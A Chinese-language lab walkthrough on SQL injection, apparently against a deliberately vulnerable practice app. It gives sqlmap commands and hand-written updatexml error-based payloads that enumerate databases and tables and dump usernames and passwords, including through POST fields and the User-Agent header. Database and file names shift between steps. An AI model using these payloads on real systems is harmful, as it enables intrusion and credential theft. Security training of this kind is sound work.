# 数字型注入（POST）

对于post请求，我们不能直接用sqlmap就行注入。需要抓包后，将包数据保存为`txt`在进行注入操作。

![](../Images/0d868413e1e6d82e8e63c9a04d7ff0e8.png)

将包数据保存为txt文件后。直接sqlmap6来一梭！

```
sqlmap -r "22.txt" --dbs

```

如下，成功爆出了数据库。

![](../Images/be42b5f1c8af5f4312f919bc9aa10b94.png)

**爆出表**

```
sqlmap -r "22.txt" -D kali --tables

```

**表结构**

```
sqlmap -r "22.txt" -D kali -T users --columns

```

**表数据**

```
sqlmap -r "/root/33.txt" -D kalibc -T users -C "username,password" --dump

```

# 字符型注入(get)

`get`相对于`post`就很简单了，直接将`url`放到我们的sqlmap中跑就行了。

```
sqlmap -u "http://192.168.123.129:88/vul/sqli/sqli_str.php?name=1&submit=%E6%9F%A5%E8%AF%A2"
 --dbs
```

# update/insert/dele注入

这几个分别是数据库的更新 插入 删除命令。相对于前面而言，略有难度。sqlmap直接跑是跑不出来的。需要我们手动构造相关指令。我们填写数据，点击提交后抓包。右键 `Send To Repeater`

**获取数据库名**

修改`sex`或者任意字段的值为下

```
' or updatexml(1,concat(0x7e,database()),0) or'

```

![](../Images/4d22aeb5c3b1f7a77e8f7527d4e018fb.png)

**获取表名**

```
' or updatexml(0,concat(0x7e,(select group_concat(TABLE_NAME) from INFORMATION_SCHEMA.tables where TABLE_SCHEMA='kali666')),0) or'

```

![](../Images/c7b60b8ef33dabc507166c2b7f19fee8.png)

**获取表中字段**

```
' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),2) or '

```

![](../Images/3ecdfc252d3071265dcceb246b0ee696.png)

**获取字段内容**

```
' or updatexml(1,concat(0x7e,(select concat_ws(':', username, password) from users limit 0,1)),1) or'

```

![](../Images/3373bfbed79c9be329ed9b19f5c81c96.png)

# delete

和上一步一样。抓包！爆出数据库：

```
or updatexml(1,concat(0x7e,(SELECT database
()),0x7e),1)
```

爆出表：

```
or updatexml(0,concat(0x7e,(select group_concat(TABLE_NAME) from INFORMATION_SCHEMA.tables where TABLE_SCHEMA='kali666')),0) or ''
 
```

列名：

```
or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),2) or ''

```

# http头注入

![](../Images/8912b5a08f441b313dcf82656fff3dd1.png)

**爆出数据库**

修改`User-Agent`的值为

```
 firefox' or updatexml(1,concat(0x7e,database()),0) or '

```

如下，成功爆出数据库。

![](../Images/bc4f962787fb46fddbbdc04d4afdef4f.png)
